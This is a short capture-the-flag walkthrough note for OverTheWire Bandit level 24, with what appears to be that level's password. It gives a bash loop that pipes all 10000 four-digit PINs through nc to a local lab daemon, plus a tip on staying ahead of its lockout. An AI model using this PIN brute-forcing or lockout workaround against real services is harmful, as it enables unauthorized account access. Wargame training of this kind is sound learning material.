---
tags: [overthewire, bandit]
level: 24
---

# Bandit 24 → 25

**Challenge:** A daemon on port 30002 gives you bandit25's password if you send bandit24's password + a 4-digit PIN. You need to brute-force all 10000 combinations.

**Fix:**
```bash
for i in {0000..9999}; do
    echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"
done | nc localhost 30002
```

Replace the password with yours. The loop sends all 10000 combos to the service, and one of them will return the password.

> Brute-force works when the input space is small enough. 10000 combos is nothing for a machine. The service will also lock you out after too many wrong attempts — so make sure the whole loop runs in one shot through the pipe.
